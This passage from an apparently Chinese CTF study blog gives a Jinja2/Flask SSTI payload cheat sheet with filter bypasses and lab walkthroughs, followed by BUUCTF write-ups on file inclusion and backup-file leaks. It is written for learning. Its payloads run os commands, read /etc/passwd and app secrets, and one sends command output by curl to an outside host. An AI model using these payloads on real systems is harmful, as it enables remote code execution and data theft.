class="language-python">&#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</code></pre><p>//实话实说最后一个不是很懂</p><p><strong>获取基类的子类</strong></p><p>​    利用<code>__subclasses__</code>函数</p><pre class="language-python" data-language="python"><code class="language-python">object.__subclasses__()&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类</code></pre><p>SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用</p><p>我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号）</p><p><strong>找到重载过的<code>__init__</code>类</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__        &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)可以查看当前位置，</code></pre><p> <strong>查看其引用<code>__builtins__</code></strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p><strong>使用os模块执行命令来读取flag或者执行命令</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;</code></pre><p><strong>来、姿势</strong></p><p><strong>1、config</strong></p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前</p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p><p><strong>2、self</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</code></pre><p><strong>3、&quot;&quot;、[]、()等数据结构</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p><p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p><p>例如：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</code></pre><p><strong>常见的过滤绕过</strong></p><p><strong>(1)只过滤<code>[]</code></strong></p><blockquote><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p></blockquote><p><strong>(2)过滤_</strong></p><p>利用<code>request.args</code>属性<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p><p><strong>(3)关键字过滤</strong></p><ul><li>base64编码绕过<br><code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>例如被过滤掉<code>__class__</code>关键词<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p><ul><li>字符串拼接绕过<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li></ul><p><strong>(4)过滤{ {</strong></p><p>使用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>，例如</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; |  grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125;</code></pre><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre><p><strong>(5)引号内十六进制绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&quot;&quot;.__class__&#125;&#125;&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;_&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre><p><strong>(6)&quot; &#39; chr等被过滤，无法引入字符串</strong></p><ul><li>直接拼接键名</li></ul><pre class="language-python" data-language="python"><code class="language-python">dict(buil&#x3D;aa,tins&#x3D;dd)|join()</code></pre><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><pre class="language-python" data-language="python"><code class="language-python">(app.__doc__|list()).pop(102)|string()</code></pre><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><pre class="language-python" data-language="python"><code class="language-python">&#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125;      # uld&#x3D;%c&#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125;</code></pre><p><strong>(7)+等被过滤，无法拼接字符串</strong></p><ul><li><code>~</code><br>在jinja中可以拼接字符串</li><li>格式化字符串<br>同上</li></ul><p>例一：<br>warnings.catch_warnings类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre><p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p><p>最后获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre><p>例二：</p><pre class="language-python" data-language="python"><code class="language-python">class’site._Printer’类&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre><p>获取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre><p>例三：<br>popen</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p><p>再获取基本类的子类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p><p>找到重载过的<code>__init__</code>类</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p><p>查看其引用<code>__builtins__</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p><p>利用eval命令执行来读取flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { ，所以要采用{ % % }的形式</p><p>{ % % }内加控制语句</p><p>且这里展示数据要利用{ % print % }</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p><p>还有一种是利用控制语句</p><p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre><p>补:</p><pre class="language-python" data-language="python"><code class="language-python">&#123;%ifsub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;</code></pre><p>要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令<br>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p><p>调用file</p><pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()      #把 read() 改为 write() 就是写文件</code></pre><p>import os</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read()</code></pre><p>调用eval</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)</code></pre><p>调用system方法。（不包含system，可以绕过过滤system的情况）</p><pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>利用commands进行命令执行</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125;</code></pre><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在学了在学了（</p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p><p>试着访问app。py</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p><p>这里可以看到过滤了一些内容</p><p>再查找目录内内容</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p><p>看见一个this_is_the_flag.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p><p>尝试去访问,得到flag</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>也可以利用切片的方式</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> ssti注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录</title>
      <link href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录一下自己buu的刷题进度，留下点wp方便以后看</p> <span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404004946660.png" alt="image-20210404004946660"></p><p>进入后看到滑稽表情，查看源码看到有source.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404005053754.png" alt="image-20210404005053754"></p><p>看到php代码</p><p>要求传入一个字符串类型的file，且需满足class emmm中的条件</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php  highlight_file(__FILE__);  class emmm  &#123;    public static function checkFile(&amp;$page)    &#123;      $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];     判断传入的参数是否为空，且是否为string类型      if (! isset($page) || !is_string($page)) &#123;        echo &quot;you can&#39;t see it&quot;;        return false;      &#125;判断传入的参数中是否有白名单内的内容      if (in_array($page, $whitelist)) &#123;        return true;      &#125;mb_substr()函数切割参数从0到第mb_strpos()函数返回的数值      $_page &#x3D; mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)      );       判断切割后的参数是否在白名单中      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;   切割后的参数经过url解码后再进行一次过滤      $_page &#x3D; urldecode($page);      $_page &#x3D; mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)      );      if (in_array($_page, $whitelist)) &#123;        return true;      &#125;      echo &quot;you can&#39;t see it&quot;;      return false;    &#125;  &#125;  if (! empty($_REQUEST[&#39;file&#39;])    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])  )      if内为真时进行文件包含  &#123;    include $_REQUEST[&#39;file&#39;];    exit;  &#125; else &#123;    echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;  &#125; </code></pre><p>由于hint.php中提示flag在ffffllllaaaagggg中且whitelist中仅有source.php和hint.php</p><p>所以传入</p><p>file=hint.php?ffffllllaaaagggg</p><p>无回显</p><p>后多次利用../查看上级目录</p><p>最终payload为</p><p>file=hint.php?/../../../../ffffllllaaaagggg</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404142347332.png" alt="image-20210404142347332"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>进入后看到这个界面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152133426.png" alt="image-20210410152133426"></p><p>查看源码可以找到Archive_room.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152211470.png" alt="image-20210410152211470"></p><p>发现这个页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152300206.png" alt="image-20210410152300206"></p><p>点击按钮后页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152324518.png" alt="image-20210410152324518"></p><p>尝试抓包发现secr3t.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152351530.png" alt="image-20210410152351530"></p><p>访问得到php代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152616564.png" alt="image-20210410152616564"></p><p>是文件包含，flag在flag.php中，过滤了../,tp,input,date.</p><p>利用php://filter绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410153820003.png" alt="image-20210410153820003"></p><p>构造file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152727528.png" alt="image-20210410152727528"></p><p>base64解码后得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152820778.png" alt="image-20210410152820778"></p><h2 id="基础验证"><a href="#基础验证" class="headerlink" title="基础验证"></a>基础验证</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144522877.png" alt="image-20210404144522877"></p><p>进入后猜测用户名为admin </p><p>密码为123456进行抓包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144619135.png" alt="image-20210404144619135"></p><p>发现存在一行<strong>Authorization: Basic YWRtaW46MTIzNDU2</strong></p><p>猜测YWRtaW46MTIzNDU2为base64加密；进行解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144840955.png" alt="image-20210404144840955"></p><p>尝试通过bp用附件中的密码进行爆破，</p><p>为密码添加前缀为admin：且要进行base64加密的规则</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144928995.png" alt="image-20210404144928995"></p><p>爆破后发现存在一个长度不同与其他包的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145023203.png" alt="image-20210404145023203"></p><p>进行发包查看其响应可发现flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145146471.png" alt="image-20210404145146471"></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>进入后发现有四个目录，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225319518.png" alt="image-20210405225319518"></p><p>依次寻找可找到flag.txt文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225337342.png" alt="image-20210405225337342"></p><p><code>./</code> 表示当前目录<br><code>../</code> 表示父级目录<br><code>/</code> 表示根目录</p><p><strong>目录遍历常见的是使用../来遍历目录</strong></p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>进入后为这种页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225956914.png" alt="image-20210405225956914"></p><p>仔细查找后可发现flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405230031564.png" alt="image-20210405230031564"></p><h2 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405232649997.png" alt="image-20210405232649997"></p><p>1.依次试试发现存在<a href="http://www.zip,下载压缩包后发现存在三个文件/">www.zip,下载压缩包后发现存在三个文件</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233727394.png" alt="image-20210405233727394"></p><p>查看flag的文件后发现其中不存在flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233814619.png" alt="image-20210405233814619"></p><p>尝试在网页中访问得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233847576.png" alt="image-20210405233847576"></p><p>2.御剑扫描</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406114539217.png" alt="image-20210406114539217"></p><p>3.利用dirsearch工具扫描</p><p>python dirsearch.py -u <a href="http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/">http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/</a> -e*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406122908681.png" alt="image-20210406122908681"></p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p>进入页面后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145718899.png" alt="image-20210412145718899"></p><p>于是查看/index.php.bak</p><p>得到文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145809693.png" alt="image-20210412145809693"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412200444012.png" alt="image-20210412200444012"></p><p>所以查看.index.php.swp可得到文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412150945950.png" alt="image-20210412150945950"></p><p>之后在Linux系统中用命令</p><p>vim -r index.php.swp打开</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412195651269.png" alt="image-20210412195651269"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>根据题目查看后缀.DS_Store</p><p>得到一个文件</p><p>用记事本就可以查看看到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154742543.png" alt="image-20210416154742543"></p><p>可得到flag</p><p><img 